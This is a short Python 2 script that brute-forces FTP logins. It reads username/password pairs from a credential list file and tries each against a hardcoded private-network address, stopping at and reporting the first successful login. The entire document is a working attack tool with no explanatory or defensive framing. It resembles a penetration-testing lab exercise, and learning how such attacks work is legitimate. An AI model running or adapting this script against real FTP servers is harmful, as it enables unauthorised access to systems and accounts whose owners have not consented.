#!/usr/bin/python
#coding=utf-8
import ftplib

def bruteLogin(hostname,passwdFile):
	pF = open(passwdFile,'r')
	for line in pF.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\r').strip('\n')
		print '[+] Trying: ' + username + '/' + password
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(username,password)
			print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + username + '/' + password
			ftp.quit()
			return (username,password)
		except Exception, e:
			pass
	print '\n[-] Could not brubrute force FTP credentials.'
	return (None,None)

host = '10.10.10.128'
passwdFile = 'ftpBL.txt'
bruteLogin(host,passwdFile)